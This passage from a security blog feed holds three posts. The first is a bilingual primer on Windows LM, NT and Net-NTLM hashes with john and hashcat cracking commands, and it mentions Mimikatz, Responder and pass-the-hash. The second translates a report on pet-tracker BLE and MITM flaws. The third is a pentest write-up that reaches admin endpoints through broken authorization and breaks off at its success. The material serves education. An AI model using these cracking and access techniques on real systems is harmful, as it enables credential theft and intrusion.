&lt;p&gt;This post is geared towards pentesters in an AD environment, and it favors practical attacks against the different hash formats. A lot of inspiration is taken from byt3bl33der’s awesome article, “Practical guide to NTLM Relaying in 2017”. If I’m missing something, please hit me up.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;這篇是滲透測試者置身於 AD 環境面向的文章，而且偏向於對於不同雜湊格式的實際攻擊。受到 byt3bl33der 超棒的文章 “&lt;a href=&quot;https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html&quot;&gt;Practical guide to NTLM Relaying in 2017&lt;/a&gt;” 超大的啟發，如果我漏了什麼請&lt;a href=&quot;https://twitter.com/petergombos&quot;&gt;讓我知道&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;All example hashes are from Hashcat’s example hashes page. The hashes I’m looking at is LM, NT, and NTLM (version 1 and 2).&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;所有的範例雜湊都是從 Hashcat 的&lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=example_hashes&quot;&gt;範例雜湊頁面&lt;/a&gt;來的。我正在研究的雜湊是 LM, NT 及 NTLM(版本 1 跟 2)。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;lm&quot;&gt;LM&lt;/h2&gt;
&lt;p&gt;About the hash&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;關於這個雜湊&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;LM-hashes is the oldest password storage used by Windows, dating back to OS/2 in the 1980’s. Due to the limited charset allowed, they are fairly easy to crack. You can obtain them, if still available, from the SAM database on a Windows system, or the NTDS database on the Domain Controller. LM was turned off by default starting in Windows Vista/Server 2008, but might still linger in a network if there older systems are still used. It is possible to enable it in later versions through a GPO setting (even Windows 2016/10).&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;時間回溯到 1980 年代的 OS/2，LM 雜湊是 Windows 所使用最古老的通行碼儲存方式。因為字元集的限制，他們很容易被破解。你可以在 Windows 系統上的 SAM 資料庫或是 Domain 控制伺服器的 NTDS 資料庫輕易地取得。LM 從 Windows Vista/Server 2008 開始預設是關閉的，但還是有可能徘徊一個擁有古老一點的系統網路中。在新一點的版本中可以 &lt;a href=&quot;https://support.microsoft.com/en-us/help/299656/how-to-prevent-windows-from-storing-a-lan-manager-hash-of-your-passwor&quot;&gt;GPO 設定&lt;/a&gt;開啟(在 Windows 2016/10 也可以)。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;When dumping the SAM/NTDS database, they are shown together with the NTHash, before the colon.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;將 SAM/NTDS 的資料倒出來的時候，你會看到分號前的是 NT 雜湊。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Example&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;例如&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;299BD128C1101FD6&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The algorithm&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;演算法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Convert all lower case to upper case
2. Pad password to 14 characters with NULL characters
3. Split the password to two 7 character chunks
4. Create two DES keys from each 7 character chunk
5. DES encrypt the string &quot;KGS!@#$%&quot; with these two chunks
6. Concatenate the two DES encrypted strings. This is the LM hash.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 將所有的字元轉成大寫
2. 用 NULL 字元將通行碼補到 14 個字元
3. 將通行碼分成兩堆，一堆 7 個字元
4. 為兩堆通行碼各產生一個 DES 密鑰
5. 兩堆跟字串&quot;KGS!@#$%&quot;一起做 DES 加密
6. 將兩個 DES 加密後的字串串在一起。這就是 LM 雜湊。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cracking it&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;破解&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=lm hash.txt
hashcat -m 3000 -a 3 hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;nthash-aka-ntlm&quot;&gt;NTHash (A.K.A NTLM)&lt;/h2&gt;
&lt;p&gt;About the hash&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;關於這個雜湊&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This is the way passwords are stored on modern Windows systems, and can be obtained by dumping the SAM database, or using Mimikatz. They are also stored on domain controllers in the NTDS file. These are the hashes you can use to pass-the-hash.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;這是當前流行的 Windows 系統所使用的通行碼儲存方式，可以從 SAM 資料庫倒出來或使用 Mimikatz 來取得。他們也被存在 Domain 控制伺服器上的 NTDS 檔案中。這是你可以用來 &lt;a href=&quot;https://en.wikipedia.org/wiki/Pass_the_hash&quot;&gt;pass-the-hash&lt;/a&gt; 的雜湊。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Usally pepole call this the NTLM hash (or just NTLM), which is misleading, as Microsoft refers to this as the NTHash (at least in some places). I personally recommend to call it the NTHash, to try to avoid confusion.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;通常人們稱之為 NTLM 雜湊(或就是 NTLM)，當 Miscrosoft 提到這個 NT 雜湊(至少在某些地方)的時候非常的誤導。我個人建議稱它為 NT 雜湊以避免混淆。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Example&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;例子&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;B4B9B02E6F09A9BD760F388B67351E2B&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The algorithm&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;演算法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;MD4(UTF-16-LE(password))&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;UTF-16-LE is the little endian UTF-16. Windows used this instead of the standard big endian, because &lt;em&gt;Microsoft&lt;/em&gt;.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;UTF-16-LE 是 逆序(編按:小頭端)版本的 UTF-16。Windos 使用這個而非順序(編按: 大頭端)，因為它是&lt;em&gt;微軟&lt;/em&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Cracking it&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;破解它&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=nt hash.txt
hashcat -m 1000 -a 3 hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ntlmv1-aka-net-ntlmv1&quot;&gt;NTLMv1 (A.K.A Net-NTLMv1)&lt;/h2&gt;
&lt;p&gt;About the hash&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;關於這個雜湊&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The NTLM protocol uses the NTHash in a challenge/response between a server and a client. The v1 of the protocol uses both the NT and LM hash, depending on configuration and what is available. The Wikipedia page on NT Lan Manager has a good explanation.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;NTLM 協議在伺服器與客戶端挑戰/回應中使用 NT 雜湊。版本1基於設定與可用性來決定是否同時使用了 NT 與 LM 雜湊，維基百科上關於 &lt;a href=&quot;https://en.wikipedia.org/wiki/NT_LAN_Manager#NTLMv1&quot;&gt;NT 內網管理者&lt;/a&gt;有很好的解釋。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;A way of obtaining a response to crack from a client, Responder is a great tool. The value to crack would be the &lt;code class=&quot;highlighter-rouge&quot;&gt;K1 | K2 | K3&lt;/code&gt; from the algorithm below. Version 1 is deprecated, but might still be used in some old systems on the network.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;一個從客戶端取得回應並破解的方法，&lt;a href=&quot;https://github.com/lgandx/Responder&quot;&gt;Responder 是一個很好用的工具&lt;/a&gt;。需要破解的值將會是下面演算法提到的 &lt;code class=&quot;highlighter-rouge&quot;&gt;k1 | k2 | k3&lt;/code&gt;。版本1已經不建議使用了，但仍舊可能會被一些網路上老舊的系統使用。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Example&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;例子&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;u4-
netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The algorithm&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;演算法&lt;/p&gt;
  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c = 8-byte server challenge, random
K1 | K2 | K3 = LM/NT-hash | 5-bytes-0
response = DES(K1, C) | DES(K2, C) | DES(K3, C)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c = 8 個位元組的伺服器挑戰，隨機的
K1 | K2 | K3 = LM/NT 雜湊 | 5 位元組個 0
response = DES(K1, C) | DES(K2, C) | DES(K3, C)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cracking it&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;打破它&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=netntlm hash.txt
hashcat -m 5500 -a 3 hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ntlmv2-aka-net-ntlmv2&quot;&gt;NTLMv2 (A.K.A Net-NTLMv2)&lt;/h2&gt;
&lt;p&gt;About the hash&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;關於這個雜湊&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This is the new and improved version of the NTLM protocol, which makes it a bit harder to crack. The concept is the same as NTLMv1, only different algorithm and responses sent to the server. Also captured through Responder or similar. Defualt in Windows since Windows 2000.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;這是 NTLM 協議最新並且改進過的版本，讓它更難被破解。整個概念跟 NTLMv1 一樣，只有送回伺服器的演算法與回應不同。還是可以用 Responder 或是類似工具擷取到。從 Windows 2000 預設開啟。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Example&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;例子&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The algorithm&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;演算法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SC = 8-byte server challenge, random
CC = 8-byte client challenge, random
CC* = (X, time, CC2, domain name)
v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
LMv2 = HMAC-MD5(v2-Hash, SC, CC)
NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
response = LMv2 | CC | NTv2 | CC*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SC = 8 位元組伺服器的挑戰，隨機的
CC = 8 位元組客戶端的挑戰，隨機的
CC* = (X, time, CC2, domain 名稱)
v2-Hash = HMAC-MD5(NT-Hash, 使用者名稱, domain 名稱)
LMv2 = HMAC-MD5(v2-Hash, SC, CC)
NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
response = LMv2 | CC | NTv2 | CC*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cracking it&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;搞它&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;in-summary--總結&quot;&gt;IN SUMMARY / 總結&lt;/h2&gt;

&lt;p&gt;LM-and NT-hashes are ways Windows stores passwords. NT is confusingly also known as NTLM. Can be cracked to gain password, or used to pass-the-hash.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;LM 與 NT 雜湊是Windows 不同儲存通行碼的方式。NT 本身是非常令人疑惑的也被當成是 NTLM。可以被破解並取得通行碼，或是用在 pass-the-hash。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;NTLM-v1/v2 are challenge response protocols used for authentication in Windows environments. These use the NT-hash in the algorithm, which means it can be used to recover the password through Brute Force/Dictionary attacks. They can also be used in a relay attack, see byt3bl33d3r’s article [1].&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;NTLM-v1/v2 是挑戰與回應協議，用來在 Windows 環境中認證用的。這些在演算法中用了 NT 雜湊，表示可以用窮舉/字典攻擊來取得通行碼。也可以被用在轉傳攻擊，可以看看 byt3bl33d3r 的文章[1]。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If you’re still confused, I would recommend reading the Wikipedia articls. I do hope this intro clears up the confusing language and can somehow help you.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;如果你還是很疑惑，我推薦你讀維基百科的文章。我希望這個簡介解開了一些疑惑，並可以幫助到你們。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;sources--資料來源&quot;&gt;Sources / 資料來源&lt;/h3&gt;

&lt;p&gt;[1] https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html&lt;/p&gt;

&lt;p&gt;[2] https://technet.microsoft.com/en-us/library/dd277300.aspx#ECAA&lt;/p&gt;

&lt;p&gt;[3] https://en.wikipedia.org/wiki/LAN_Manager&lt;/p&gt;

&lt;p&gt;[4] https://en.wikipedia.org/wiki/NT_LAN_Manager&lt;/p&gt;

&lt;p&gt;[5] https://en.wikipedia.org/wiki/Security_Account_Manager&lt;/p&gt;

&lt;p&gt;[6] https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/p&gt;</content><author><name>jhe</name></author><category term="Windows" /><category term="NT-Hash" /><summary type="html">LM, NTLM, Net-NTLMv2, oh my!</summary></entry><entry><title type="html">寵物追踪器對MITM攔截攻擊毫不設防</title><link href="https://security-onigiri.github.io//2018/06/12/mitm.html" rel="alternate" type="text/html" title="寵物追踪器對MITM攔截攻擊毫不設防" /><published>2018-06-12T00:00:00+08:00</published><updated>2018-06-12T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/06/12/mitm</id><content type="html" xml:base="https://security-onigiri.github.io//2018/06/12/mitm.html">&lt;p&gt;&lt;a href=&quot;https://threatpost.com/author/sealstara/&quot;&gt;Tara Seals&lt;/a&gt; ‧ 2018年5月25日下午3:25&lt;/p&gt;

&lt;p&gt;家寵與我們非常親近，所以智慧頸環和其他能跟踪他們位置的動物裝置變得越來越流行;畢竟一個無需張貼丟失寵物傳單的世界絕對是個美好的世界，對吧？但研究人員指出這些裝置的問題，在於這些裝置可能會洩露敏感信息，例如電話號碼，寵物的位置或家庭網路的拓樸。&lt;/p&gt;

&lt;p&gt;在檢查了包括 Kippy Vita，Nuzzle Pet Activity 和 GPS Tracker 以及 Whistle 3 GPS 寵物追踪與活動監控器 在內幾款經過充分審查的型號後，卡巴斯基實驗室的測試人員發現了一些應該讓Rover消費者注意的問題。&lt;/p&gt;

&lt;h2 id=&quot;憂鬱的藍牙&quot;&gt;&lt;strong&gt;憂鬱的藍牙&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在檢查了一些追踪器後發現一個常見問題，這些問題被歸結為使用了專為低功耗物聯網傳感器應用所定制的”藍牙低功耗”（ BLE ）。 BLE 實質上是將這些寵物追蹤器連接到所有者的智慧型手機上，但其並不完全遵照藍牙的實施規範，BLE不需要認證就可以配對設備。&lt;/p&gt;

&lt;p&gt;研究人員 Roman Unuchek 和 Roland Sako 在本週發布一份概述他們研究的報告中說：「驗證完全取決於設備的開發人員，而過往經驗表明它經常被忽視。」&lt;/p&gt;

&lt;p&gt;例如， Nuzzle 設備使用 SIM 卡傳輸寵物的 GPS 坐標，通過 BLE 直接連接到智能手機 - 無需任何授權或存取控制。這意味著任何智能手機都可以連接到追蹤器來控制它並訪問寵物的位置，以及設備狀態信息，例如溫度和電池電量（ CVE-2018-7043 ）。&lt;/p&gt;

&lt;p&gt;Whistle 3 同時也存在 BLE 連接問題。該裝置可以通過其內置的 SIM 卡或 Wi-Fi 將其 GPS 坐標傳輸到其伺服器（如果裝置擁有者提供 Wi-Fi 網路密碼）或通過 BLE 直接向裝置擁有者的智慧型手機傳輸 GPS 坐標。在後一點上，該裝置在與智慧型手機配對之前會等待一系列的動作交互，但那些動作對於第三方來說只是簡單的推斷就可重現，從而獲得對裝置的訪問權限。&lt;/p&gt;

&lt;p&gt;在這流程完成之後，這些追踪器即準備接收並執行任何命令; 例如駭客可能會要求設備的坐標位置。&lt;/p&gt;

&lt;p&gt;這些有 BLE 前端追蹤器之中唯一例外的是 Link AKC 追踪器。雖然它通過 GPS 監測寵物的位置，並通過內置 SIM 卡將坐標直接通過 BLE 傳輸到手機，但它使用用戶 ID 來驗證移動應用與追蹤器接口的權限。追蹤器還會檢查智能手機的 MAC 地址，作為用戶身份認證的另一層防護。&lt;/p&gt;

&lt;p&gt;研究人員說：「該開發者在確保與智能手機的連接方面做了一切正確的事情。」 「我們找不到任何重大問題，這對於支持 BLE 的設備來說是很少見的事。」&lt;/p&gt;

&lt;p&gt;此外， Kippy Vita 設備根本不與智能手機直接連接，所以完全沒有BLE問題，而且特別的一點是它使用 SSL 鎖定。 Tractor 和 Weenect WE301 都不能直接與智能手機通信，而是通過內置的 SIM 卡將寵物坐標傳輸到伺服器上。這對於設備的安全非常有幫助。&lt;/p&gt;

&lt;h2 id=&quot;mitm-問題&quot;&gt;&lt;strong&gt;MITM 問題&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;除了 BLE 漏洞之外，一些追踪器還存在共享憑證處理和數據傳輸機制的缺陷。只有一個 Android 應用程式通過測試， Android 應用程式（ Weenect WE301 ）會驗證其伺服器的憑證，而其他應用程式很容易受到中間人（ MITM ）攻擊。&lt;/p&gt;

&lt;p&gt;除了不驗證憑證之外，許多應用程式（包括 Nuzzle ， Link AKC 和Whistle 3 ）都可以存儲未加密的數據，或將未加密的數據傳輸到logcat 文件中。該數據可能包括應用程式的授權 token，寵物的位置和用戶註冊數據（包括姓名和電子郵件地址）。因此，一個發起 MITM 攻擊的駭客可以攔截數據傳輸或直接獲取到文件。&lt;/p&gt;

&lt;p&gt;Kippy Vita 的 Android 應用程式在將重要數據保存到自己的文件夾之前會對其進行加密，但它會記錄傳輸到伺服器的數據。&lt;/p&gt;

&lt;p&gt;研究中的兩個設備似乎可以避免被卡巴斯基申報 CVE：Tractive 和 Weenect WE301 。然而，不幸的是研究發現其 Android 應用程式也不會驗證伺服器憑證，它們以未加密的形式存儲身份驗證 token 和寵物的移動數據。&lt;/p&gt;

&lt;p&gt;也就是說，即使日誌記錄問題因為在 Android 4.1 和更新版本中，只有一些具有超級用戶權限的系統應用或應用可以讀取其他程序的日誌而有些許緩解，但仍存在其問題。&lt;/p&gt;

&lt;p&gt;研究人員說：「應該指出的是，這些數據雖然並不容易被竊取，這是因為其他應用程式無法讀取它，但是有些木馬可以通過利用超級用戶權限從其他應用盜取數據。」&lt;/p&gt;

&lt;h2 id=&quot;其他問題&quot;&gt;&lt;strong&gt;其他問題&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;同時，其中兩個追踪器可以被停用或隱藏自身不讓所有者找到。&lt;/p&gt;

&lt;p&gt;例如，可以通過更改 DAT 文件中的雜湊值來在 Nuzzle 追蹤器上安裝修改後的軟體 - 這可以用來使該設備停止運作。也許最糟糕的是，只需通過智慧型手機連接到追蹤器，攻擊者就可以隱藏寵物的位置。&lt;/p&gt;

&lt;p&gt;「為了節省電池電量，如果工具已經成功通過 BLE 發送，它就不會通過行動網路來傳輸坐標，」Unuchek 和 Saco 說。&lt;/p&gt;

&lt;p&gt;攻擊者也可以隱藏 Whistle 3 來不讓寵物主人找到。如果駭客持續傳輸設備位置的命令，該裝置將不會通過 SIM 卡來發送位置數據，因為它會假定這些數據已被直接接收。而且，它還無需任何身份驗證就可以將數據傳輸到伺服器，因此攻擊者可以用假寵物坐標來替換。&lt;/p&gt;

&lt;h2 id=&quot;這只是又一個對物聯網安全的警示&quot;&gt;&lt;strong&gt;這只是又一個對物聯網安全的警示&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;當相互連接的東西越來越深入到我們的日常生活中，從恆溫器到亞馬遜 Echo 或洗衣機/烘乾機等各種設備，現在都在為消費者提供便利和安全的應用程式，想讓他們的生活變得更加輕鬆 - 並且更加易於使用。寵物追蹤器類連接的裝置為這個進步訴求增加了一層陰影，但要求對這些漏洞關注聲浪可能會提醒製造商對問題做出應對。&lt;/p&gt;

&lt;p&gt;Synopsys 首席安全工程師 Chris Clark 告訴 Threatpost ：「誰知道 FIDO 何時會決定自己去檢查他們的藍牙LE 和支援 cellular 的 GPS 是否可被網路攻擊者當做切入點？在物聯網設備上實現安全性需要多層次的方法，加密流量或啟用身份驗證只是其複雜難題的一部分。在急於上市時，開發人員常忽略了本研究中突出顯示的許多細微差別。研究人員展示了在產品開發團隊中建立安全開發的能力是多麼重要，或是與值得信賴的合作夥伴一起工作，而這些合作夥伴在將產品推向市場之前具有應對網路安全挑戰的經驗和能力。」&lt;/p&gt;

&lt;p&gt;※註:Fast Identification Online ( FIDO ) 
※註:Cellular 代表著支援 4G LTE、3G、 HSPA、HSPA+ 和 DC-HSDPA 行動網路之統稱。&lt;/p&gt;

&lt;p&gt;他補充說，雖然這項研究的重點是 GPS 和 BLE ，但攻擊路徑中的弱點可以在多個行業的產品中找到。&lt;/p&gt;

&lt;p&gt;他說：「這項研究突顯了物聯網領域面臨的更大挑戰，我如何生產安全的物聯網設備？儘管一些設備採取一些措施解決了他們所謂的『安全問題』，但研究人員仍然發現每台設備上的其他區域都存在數據洩露和故障。尋求安全性和可用性之間的平衡對於嵌入式物聯網產品開發人員來說仍然是一個挑戰。在很多情況下，使用靜態代碼分析和模糊測試都可能會發現這些漏洞，並確保寵物安全回家。」&lt;/p&gt;

&lt;p&gt;Comparitech.com 隱私權倡導者 Paul Bischoff 告訴我們，考慮到對於消費者而言，了解其連接設備的安全狀態是一項挑戰，這一點尤為重要。與我們的智慧型手機和電腦上的網路瀏覽器不同，沒有綠色的鎖可以告訴您，您的物聯網設備是否已連接到正確的伺服器，以及所發送的數據是否已加密。這意味著普通人無法知道駭客是否正在竊取有關追踪器的位置或其他隱私訊息。出於這個原因，物聯網製造商在安全方面需要加強他們的遊戲規則。&lt;/p&gt;

&lt;p&gt;本文於 5/29/2018 於 6:11 ET 更新，更新內容來自 Synopsys 和 Comparitech.com 在物聯網安全上的評論。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="BLE" /><category term="IOT" /><category term="Mobile APP" /><summary type="html">Tara Seals ‧ 2018年5月25日下午3:25</summary></entry><entry><title type="html">用偵查來PWN解後端控制台</title><link href="https://security-onigiri.github.io//2018/05/15/Recon-to-PWN-the-Panel.html" rel="alternate" type="text/html" title="用偵查來PWN解後端控制台" /><published>2018-05-15T00:00:00+08:00</published><updated>2018-05-15T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/05/15/Recon-to-PWN-the-Panel</id><content type="html" xml:base="https://security-onigiri.github.io//2018/05/15/Recon-to-PWN-the-Panel.html">&lt;p&gt;偵察是滲透測試中有趣且最重要的部分。良好的使用偵察，可以有效的查找到 API 端口、相關敏感文件或文件夾、鮮嫩多汁的子網域 (編註:原文如此) 等等。在我最近一次的研究中發現了一個由於缺少授權管理甚至敏感文件還設為公開的目標，這使我能夠輕易進入其管理控制台。&lt;/p&gt;

&lt;p&gt;讓我首先從靜態分析 iOS 應用程式開始。在瀏覽&lt;a href=&quot;https://developer.apple.com/library/content/documentation/General/Reference/InfoPlistKeyReference/Articles/iPhoneOSKeys.html#//apple_ref/doc/uid/TP40009252-SW1&quot;&gt;Info.plist&lt;/a&gt;時，我們可以看到裡面有一個寫死的 URL。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[nishaanthguna:~/pentest]$ cat Info.plist | grep -i &quot;http&quot;
&amp;lt;!DOCTYPE plist PUBLIC .. &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;string&amp;gt;https://admin.company.com/xyz/api&amp;lt;/string&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;以此為憑依繼續追查這個URL下去，我們得到一個連結到 Swagger UI 的頁面。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/gxdQJhr.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然後我們粗略的翻一翻&lt;a href=&quot;https://swagger.io/swagger-ui/&quot;&gt;官方文件&lt;/a&gt;，我們可以看到 Swagger UI 是個用於可視化處理和與 API 互動的資源，它會自動根據載明之規範產生交互。以下是在檢查上一個 UI 頁面時找到的 URL。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/mfUxtoy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這裡令人奇怪的是，不僅只在於它行動裝置應用程序的 API 呼叫方式，它甚至還有管理員可以用來管理用戶、管理廣播的內容、管理自定義應用程式使用的聊天機器人端口等等。深入研究額外端口的資訊後，我啟動了 Burp 來查看網路流量。起初，我的想法是用 Swagger UI 中的管理端口來替換行動裝置應用程序的端口，用這方法來檢查 Swagger UI 中的管理端口該程式是否有針對這點設置合適的權限管理來區分普通用戶和管理員帳戶。&lt;/p&gt;

&lt;p&gt;從“管理員帳戶”API文檔中，我們可以看到有一個端口使用&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/users/count&lt;/code&gt;打印出管理員用戶數。這看起來很有&lt;strong&gt;前途&lt;/strong&gt;，因為它不需要任何請求主體(Request body)，而且非常簡單。&lt;/p&gt;

&lt;p&gt;以普通用戶身份登入到行動裝置應用程序，我將其中一個 API 呼叫從&lt;code class=&quot;highlighter-rouge&quot;&gt;/xyz /api/users/account/preferences&lt;/code&gt;更換為&lt;code class=&quot;highlighter-rouge&quot;&gt;/xyz/api/admin/users/count&lt;/code&gt;並轉發請求。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/dLiDWpv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;成功了！
